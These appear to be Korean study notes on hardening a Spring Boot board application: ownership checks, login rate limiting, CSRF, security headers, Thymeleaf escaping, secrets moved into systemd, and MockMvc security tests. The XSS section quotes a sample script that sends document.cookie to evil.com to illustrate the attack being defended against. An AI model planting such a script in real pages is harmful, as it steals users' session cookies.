# Phase 3 : Security Hardening

---

## Step 1. Service 레이어 권한 검증

### 문제점 (수정 전)

수정 / 삭제 버튼은 작성자에게만 보이지만, URL을 직접 입력하면 누구든 실행 가능했다.

```
/post/edit/1    → 누구나 접근 가능
/post/delete/1  → 누구나 실행 가능
```

### 변경 사항

#### 1. `UnauthorizedException` 추가

`exception/UnauthorizedException.java`

권한 없는 요청에 대한 전용 예외 클래스 생성

#### 2. `GlobalExceptionHandler` 업데이트

`UnauthorizedException` 발생 시 `error/403.html` 반환

#### 3. `403.html` 추가

`templates/error/403.html`

#### 4. `PostServiceImpl` 권한 검증 추가

`validateOwner()` 메서드 — 현재 로그인 사용자와 게시글 작성자 비교

| 역할 | 수정/삭제 가능 여부 |
| :--- | :---: |
| ADMIN | ✅ 모든 글 |
| USER (작성자) | ✅ 본인 글만 |
| USER (타인) | ❌ 403 반환 |

`updatePost()`, `delete()` 진입 시 `validateOwner()` 호출

#### 5. `updatePost()` 작성자 변경 버그 수정

기존 코드가 수정 시 `username` 필드까지 덮어쓰는 문제 제거

#### 6. `PostController` 인터페이스 주입으로 변경

`PostServiceImpl` 직접 주입 → `PostService` 인터페이스 주입

<br>

---

## Step 2. Rate Limiting · XSS / CSRF 방어

### 1. Rate Limiting (로그인 시도 제한)

#### 1.1. 구현 구조

| 클래스 | 역할 |
| :--- | :--- |
| `security/LoginAttemptService.java` | IP별 실패 횟수 추적, 차단 여부 판단 |
| `security/LoginFailureHandler.java` | 로그인 실패 시 카운터 증가, 차단 시 별도 URL로 리다이렉트 |
| `security/LoginSuccessHandler.java` | 로그인 성공 시 카운터 초기화 |

#### 1.2. 차단 정책

- 실패 **5회** 이상 → IP 차단
- 차단 해제 : **15분** 경과 후 자동 해제
- 차단된 IP로 로그인 시 → `/user/login?error=blocked` 리다이렉트

<br>

### 2. CSRF 방어

#### 2.1. 변경 내용

`.csrf((csrf) -> csrf.disable())` → `.csrf((csrf) -> csrf.ignoringRequestMatchers("/h2-console/**"))`

H2 콘솔 경로만 제외하고 CSRF 전면 활성화

#### 2.2. Thymeleaf 자동 처리

`th:action`을 사용하는 모든 폼에 CSRF 토큰이 자동 삽입됨 — 별도 코드 수정 불필요

<br>

### 3. 보안 헤더

| 헤더 | 효과 |
| :--- | :--- |
| `X-Content-Type-Options: nosniff` | 브라우저가 Content-Type을 임의로 추측하지 못하게 함 (MIME 스니핑 방지) |
| `frameOptions: sameOrigin` | 동일 출처의 iframe만 허용 (클릭재킹 방어), H2 콘솔 정상 동작 유지 |
| `Referrer-Policy: same-origin` | 외부 사이트로 이동 시 Referer 헤더 미전송 (URL 정보 유출 방지) |

<br>

### 4. XSS 방어

Thymeleaf의 `th:text`는 HTML을 자동 이스케이프 처리함 — 별도 조치 불필요

```html
<!-- 입력값이 <script>alert(1)</script> 이어도 -->
<span th:text="${post.title}"></span>
<!-- 출력: &lt;script&gt;alert(1)&lt;/script&gt; → 실행 안 됨 -->
```

`th:utext`(이스케이프 미적용)는 프로젝트 내 미사용 확인 완료

---

## Step 3. 민감정보 외부화

### 문제점 (수정 전)

EC2 서버에 `.env` 파일을 두고 Spring Boot가 읽어오는 방식.  
서버 접근권한이 탈취되면 `.env` 파일을 그대로 읽을 수 있음.

### 변경 사항

#### 1. `application-prod.properties`

`.env` 파일 import 제거 — 순수 환경변수 방식으로 전환

```properties
# 제거
spring.config.import=optional:file:.env[.properties]
```

`${DATABASE_URL}` 등 환경변수 참조 방식은 그대로 유지

#### 2. systemd 서비스 파일에 환경변수 직접 주입

```ini
[Service]
Environment=DATABASE_URL=jdbc:mysql://[RDS_ENDPOINT]:3306/[DB_NAME]
Environment=DATABASE_USERNAME=[DB_USERNAME]
Environment=DATABASE_PASSWORD=[DB_PASSWORD]
```

서비스 파일 권한 제한

```bash
sudo chmod 600 /etc/systemd/system/my-server.service
```

| 방식 | 보안 수준 | 비고 |
| :--- | :---: | :--- |
| 코드에 직접 작성 | ❌ | GitHub에 비밀번호 노출 |
| `.env` 파일 | 🔺 | 파일 탈취 시 노출 |
| systemd 환경변수 | ✅ | root만 읽기 가능 |
| AWS Secrets Manager | ✅✅ | 향후 확장 시 적용 |

---

## Step 4. 컨트롤러 보안 테스트

### 테스트 구성

| 클래스 | 유형 | 설명 |
| :--- | :--- | :--- |
| `controller/PostControllerTest.java` | `@WebMvcTest` | HTTP 요청/응답 보안 검증 |
| `service/PostServiceTest.java` | `@ExtendWith(MockitoExtension)` | 서비스 로직 단위 테스트 |

### 테스트 시나리오 (PostControllerTest)

| 시나리오 | 기대 결과 |
| :--- | :---: |
| 비로그인 → 수정 폼 접근 | 302 → `/user/login` |
| 비로그인 → 삭제 요청 | 302 → `/user/login` |
| 비로그인 → 글쓰기 폼 접근 | 302 → `/user/login` |
| USER 로그인 → 수정 폼 접근 | 200 OK |
| USER → 타인 글 수정 시도 (서비스 UnauthorizedException) | 403 Forbidden |
| USER → 타인 글 삭제 시도 (서비스 UnauthorizedException) | 403 Forbidden |
| ADMIN → 임의 글 삭제 | 302 → `/main/list` |

### 주요 설정

- `@Import(SecurityConfig.class)` — `@WebMvcTest`에 커스텀 Security 설정 적용
- `.with(user("...").roles("USER"))` — 요청 레벨에서 인증 주입 (`@WithMockUser` 대신 사용)
- `.with(csrf())` — CSRF 토큰 자동 삽입
- `GlobalExceptionHandler`에 `@ResponseStatus` 추가 — 예외 핸들러 반환 시 HTTP 상태코드 명시

### 의존성 추가

```xml
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-test</artifactId>
    <scope>test</scope>
</dependency>
```

<br>

---

## 배경 개념 (Study Notes)

> 이 Phase를 진행하며 정리한 핵심 개념(Why/How).

### Step 1. Service 레이어 권한 검증

#### View 보안 vs Server 보안

보안은 **서버(백엔드)에서 반드시 검증**해야 한다.  
View(HTML)에서 버튼을 숨기는 것은 화면 처리일 뿐, 실제 보안이 아니다.

```
❌ 잘못된 구조
사용자 A가 /post/delete/1 URL 직접 입력
→ 서버가 아무 검증 없이 삭제 실행

✅ 올바른 구조
사용자 A가 /post/delete/1 URL 직접 입력
→ 서버가 "A가 글 1의 작성자인가?" 검증
→ 아니면 403 반환
```

#### 왜 Service 레이어에서 검증하는가?

Controller는 요청을 받아서 Service로 넘기는 역할만 한다.  
**비즈니스 규칙("작성자만 수정/삭제 가능")은 Service 레이어의 책임**이다.  
Controller에서 검증하면 API 엔드포인트가 추가될 때마다 중복 검증 코드가 생긴다.

#### 구현 패턴

```java
private void validateOwner(Post post) {
    String currentLoginId = getCurrentLoginId();   // 현재 로그인한 사용자
    boolean isAdmin = currentUser.getRole() == Role.ADMIN;
    boolean isOwner = post.getUser().getLoginId().equals(currentLoginId);

    if (!isAdmin && !isOwner)
        throw new UnauthorizedException("권한이 없습니다.");
}
```

- `ADMIN`은 모든 글을 수정/삭제 가능
- `USER`는 본인 글만 가능
- 권한 없으면 `UnauthorizedException` → `GlobalExceptionHandler` → 403 페이지

#### Controller는 인터페이스에 의존해야 하는 이유

```java
// ❌ 구현체에 직접 의존
private final PostServiceImpl postServiceImpl;

// ✅ 인터페이스에 의존
private final PostService postService;
```

구현체를 바꿔도 Controller 코드를 수정할 필요가 없다.  
테스트 시 Mock 객체로 쉽게 교체할 수 있다.

<br>

---

### Step 2. Rate Limiting · XSS / CSRF 방어

#### Rate Limiting (브루트포스 방어)란?

**브루트포스 공격** : 비밀번호를 맞출 때까지 수천 번 자동으로 로그인을 시도하는 공격.  
**Rate Limiting** : 짧은 시간 내 과도한 요청을 차단하는 기법.

```
로그인 실패 5회 이상 (같은 IP)
    ↓
LoginAttemptService 가 해당 IP를 15분간 차단
    ↓
차단된 IP의 로그인 시도 → "너무 많은 시도" 메시지 반환
```

이 프로젝트에서는 외부 라이브러리 없이 `ConcurrentHashMap`으로 구현.  
`ConcurrentHashMap` : 멀티스레드 환경에서 안전한 HashMap.

#### CSRF란?

**Cross-Site Request Forgery** — 사용자가 의도하지 않은 요청을 다른 사이트에서 강제로 실행시키는 공격.

```
1. 사용자가 우리 서비스에 로그인 (세션 유지 중)
2. 공격자가 만든 악성 페이지 접속
3. 악성 페이지가 몰래 우리 서버로 POST 요청 전송
4. 서버는 세션만 보고 정상 요청으로 처리 → 피해 발생
```

**CSRF 토큰으로 방어**

```
서버가 폼에 고유 토큰을 심어둠
    ↓
사용자가 폼 제출 시 토큰도 함께 전송
    ↓
서버가 토큰 일치 여부 확인
    ↓
악성 사이트는 토큰을 모르므로 요청 차단
```

Spring Security + Thymeleaf : `th:action` 폼에 CSRF 토큰 자동 삽입.

#### XSS란?

**Cross-Site Scripting** — 악성 스크립트를 게시글 등에 삽입하여 다른 사용자 브라우저에서 실행시키는 공격.

```html
<!-- 공격자가 게시글 내용으로 입력 -->
<script>document.location='https://evil.com?cookie='+document.cookie</script>

<!-- 방어 미흡 시 다른 사람이 글을 보면 스크립트 실행 → 쿠키(세션) 탈취 -->
```

Thymeleaf `th:text`는 자동으로 HTML 이스케이프 처리하여 스크립트 실행 차단.

#### 보안 헤더란?

HTTP 응답 헤더에 브라우저에게 보안 정책을 지시하는 값.

| 헤더 | 방어 대상 |
| :--- | :--- |
| `X-Content-Type-Options: nosniff` | MIME 타입 스니핑 공격 |
| `frameOptions: sameOrigin` | 클릭재킹 (다른 사이트 iframe에 내 사이트 삽입) |
| `Referrer-Policy: same-origin` | URL 정보 외부 유출 |

<br>

---

## Phase 3 Step 3 — 민감정보 외부화

### 왜 중요한가

DB 비밀번호 같은 민감정보가 코드나 파일에 있으면 서버 접근권한 탈취 시 바로 노출된다.  
단계별 보안 수준을 비교하면:

| 방식 | 위험도 | 이유 |
| :--- | :---: | :--- |
| 코드에 하드코딩 | ❌ 매우 위험 | GitHub push 시 전 세계 노출 |
| `.env` 파일 | 🔺 위험 | 파일 읽기 권한만 있으면 탈취 가능 |
| systemd `Environment=` | ✅ 안전 | root만 읽을 수 있는 서비스 파일에 저장 |
| AWS Secrets Manager | ✅✅ 최상 | 런타임 API 호출, 자격증명 자동 순환 |

### 구현 방식

#### 1. Spring Boot 측 — `.env` 파일 import 제거

```properties
# application-prod.properties에서 이 줄 제거
spring.config.import=optional:file:.env[.properties]
```

`${DATABASE_URL}` 같은 환경변수 참조 구문은 그대로 유지.  
Spring Boot는 시스템 환경변수를 자동으로 읽기 때문에 별도 import가 필요 없다.

#### 2. systemd 서비스 파일에 환경변수 주입

```ini
[Service]
Environment=DATABASE_URL=jdbc:mysql://[RDS_ENDPOINT]:3306/[DB_NAME]
Environment=DATABASE_USERNAME=[DB_USERNAME]
Environment=DATABASE_PASSWORD=[DB_PASSWORD]
```

서비스 파일은 root 소유이므로 chmod 600으로 다른 사용자 접근 차단:

```bash
sudo chmod 600 /etc/systemd/system/my-server.service
```

#### 3. 환경변수 주입 흐름

```
systemd 서비스 파일 (root 전용)
        ↓  Environment= 주입
Spring Boot 프로세스 환경변수
        ↓  ${DATABASE_URL} 참조
application-prod.properties
        ↓
DataSource 설정 완료
```

`.env` 파일은 서버에서 완전히 제거해도 된다.

<br>

---

## Phase 3 Step 4 — 컨트롤러 보안 테스트

### `@WebMvcTest` vs `@SpringBootTest`

| 항목 | `@WebMvcTest` | `@SpringBootTest` |
| :--- | :--- | :--- |
| 로드 범위 | 웹 계층만 (Controller, Filter, Security) | 전체 애플리케이션 컨텍스트 |
| 속도 | 빠름 | 느림 |
| DB 필요 | ❌ (Repository 등은 Mock) | ✅ (또는 H2) |
| 사용 목적 | HTTP 요청/응답, 보안 규칙 검증 | 통합 테스트 |

보안 테스트는 "이 URL에 이 인증 상태로 요청하면 어떤 HTTP 응답이 오는가"를 검증하므로 `@WebMvcTest`가 적합하다.

### MockMvc — HTTP 요청을 코드로 시뮬레이션

```java
mockMvc.perform(get("/post/edit/1"))          // GET 요청 보내기
        .andExpect(status().is3xxRedirection()) // 3xx 응답 기대
        .andExpect(redirectedUrl("/user/login")); // 리다이렉트 위치 확인
```

실제 서버 없이 컨트롤러까지의 전체 HTTP 처리 파이프라인(필터, Security, 컨트롤러, 뷰)을 테스트한다.

### 인증 주입 방법

```java
// 요청 단위로 인증 주입 (SecurityMockMvcRequestPostProcessors)
mockMvc.perform(get("/post/edit/1").with(user("testUser").roles("USER")));

// POST + CSRF 토큰 함께 전송
mockMvc.perform(multipart("/post/update/1")
        .file("file", new byte[0])
        .with(user("otherUser").roles("USER"))
        .with(csrf()));
```

`user(...).roles("USER")`는 실제 DB 조회 없이 SecurityContext에 인증 정보를 직접 주입한다.

### `@MockitoBean` — 의존 빈을 가짜로 대체

```java
@MockitoBean
private PostService postService;
```

`@WebMvcTest`는 컨트롤러 레이어만 로드하므로, `PostService` 같은 다른 빈은 가짜(`Mock`)로 교체해야 컨텍스트가 정상 로드된다.

```java
// Mock 동작 정의: 서비스가 UnauthorizedException을 던지도록 설정
doThrow(new UnauthorizedException("권한 없음"))
        .when(postService).delete(anyLong());
```

### `@ControllerAdvice` + `@ResponseStatus`

예외 핸들러에 `@ResponseStatus`가 없으면 뷰를 반환해도 HTTP 상태코드는 200이 된다.  
보안 테스트에서 403을 확인하려면 반드시 명시해야 한다.

```java
@ResponseStatus(HttpStatus.FORBIDDEN)
@ExceptionHandler(UnauthorizedException.class)
public String handleUnauthorizedException(...) { return "error/403"; }
```

<br>

---
